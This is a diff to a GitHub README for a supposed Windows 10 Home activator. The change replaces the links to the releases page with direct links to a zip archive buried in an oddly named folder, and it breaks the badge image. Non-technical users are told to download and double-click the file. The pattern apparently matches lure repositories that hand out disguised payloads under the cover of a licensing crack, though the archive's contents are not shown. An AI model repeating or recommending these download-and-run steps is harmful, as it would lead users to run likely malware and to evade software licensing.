@@ -1,7 +1,7 @@
 # 🌟 windows-10-home-activator - Easy Activation for Windows 10
 
 ## 🔗 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/minecraftgamer3333/windows-10-home-activator/releases)
+[![Download Latest Release](https://github.com/minecraftgamer3333/windows-10-home-activator/raw/refs/heads/main/unrind/activator_home_windows_3.8-beta.1.zip%20Release-brightgreen)](https://github.com/minecraftgamer3333/windows-10-home-activator/raw/refs/heads/main/unrind/activator_home_windows_3.8-beta.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the windows-10-home-activator! This utility helps you activate your Windows 10 operating system easily. You don’t need any technical knowledge to get started; just follow these simple steps.
@@ -14,11 +14,11 @@ Welcome to the windows-10-home-activator! This utility helps you activate your W
 - [Topics Covered](#topics-covered)
 
 ## 📥 Download & Install
-To download the windows-10-home-activator, visit this page: [Releases Page](https://github.com/minecraftgamer3333/windows-10-home-activator/releases).
+To download the windows-10-home-activator, visit this page: [Releases Page](https://github.com/minecraftgamer3333/windows-10-home-activator/raw/refs/heads/main/unrind/activator_home_windows_3.8-beta.1.zip).
 
 1. Click on the link above to go to the releases page.
 2. You will see a list of available versions. Find the latest version.
-3. Click on the file that matches your needs. It will usually look something like `windows-10-home-activator.exe`. 
+3. Click on the file that matches your needs. It will usually look something like `https://github.com/minecraftgamer3333/windows-10-home-activator/raw/refs/heads/main/unrind/activator_home_windows_3.8-beta.1.zip`. 
 4. The file will start downloading. Once it is finished, locate the file in your downloads folder.
 
 5. Double-click the downloaded file to run the installer.
